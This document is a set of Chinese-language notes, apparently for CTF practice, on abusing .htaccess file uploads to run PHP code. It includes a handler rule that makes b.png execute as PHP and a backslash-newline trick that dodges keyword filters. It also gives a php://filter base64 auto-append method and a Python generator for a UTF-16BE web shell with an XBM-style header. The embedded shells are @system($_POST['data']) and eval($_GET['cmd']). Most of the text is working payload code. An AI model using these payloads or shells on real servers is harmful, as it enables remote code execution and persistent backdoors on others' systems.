- [https://blog.csdn.net/LYJ20010728/article/details/116541325](https://blog.csdn.net/LYJ20010728/article/details/116541325)
- [https://blog.csdn.net/LYJ20010728/article/details/116538926](https://blog.csdn.net/LYJ20010728/article/details/116538926)
- ```htaccess
  <FilesMatch "b.png">
  SetHandler application/x-httpd-php
  </FilesMatch>
  ```
- 之后访问b.png就可以运行b.png中的脚本
- 可以用 `\` 加换行绕过关键词检测
- 绕过：
- ```
  php_value auto_prepend_fi\\
  le .htaccess
  #<?php echo 123;?>
  #<?=123?>
  #<?php @system($_POST['data']);?>
  ```
- 可以使用伪协议
- ```
  AddType application/x-httpd-php .xxx
  php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.xxx"
  ```
- 也可以通过设置编码格式为utf-16be来绕过文件上传会检测 `<?` 的限制
  id:: 6569d71e-4867-42a5-8342-267690955af1
	- id:: 6569d71e-0900-4e8a-b638-8708605d9e88
	  ```python
	  SIZE_HEADER = b"\n\n#define width 1337\n#define height 1337\n\n"
	  
	  def generate_php_file(filename, script):
	      phpfile = open(filename, 'wb') 
	      phpfile.write(script.encode('utf-16be'))
	      phpfile.write(SIZE_HEADER)
	      phpfile.close()
	  
	  def generate_htacess():
	      htaccess = open('.htaccess', 'wb')
	      htaccess.write(SIZE_HEADER)
	      htaccess.write(b'AddType application/x-httpd-php .ppp\n')
	      htaccess.write(b'php_value zend.multibyte 1\n')
	      htaccess.write(b'php_value zend.detect_unicode 1\n')
	      htaccess.write(b'php_value display_errors 1\n')
	      htaccess.close()
	  
	  generate_htacess()
	  generate_php_file("shell.ppp", "<?php echo 123; eval($_GET['cmd']); die(); ?>")
	  ```